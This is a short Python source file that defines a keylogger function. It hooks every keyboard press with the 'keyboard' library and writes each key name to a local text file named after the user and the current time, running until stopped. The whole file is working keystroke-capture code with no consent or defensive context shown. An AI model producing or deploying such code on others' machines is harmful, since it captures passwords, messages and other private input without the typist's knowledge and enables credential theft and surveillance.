import logging
import keyboard
from current_time import current_time
from user_name import user_name


def key_logger():

    logging.basicConfig(filename="keylog-"+user_name()+current_time()+".txt", level=logging.INFO, format="%(message)s")

    # define a callback function to process the keystrokes
    def on_key_press(event):
        # get the name of the pressed key
        key = event.name
        # write the keystroke to the log file
        logging.info(key)

    # hook the keyboard events with the callback function
    keyboard.on_press(on_key_press)
    # start the hook and keep the script running
    keyboard.wait()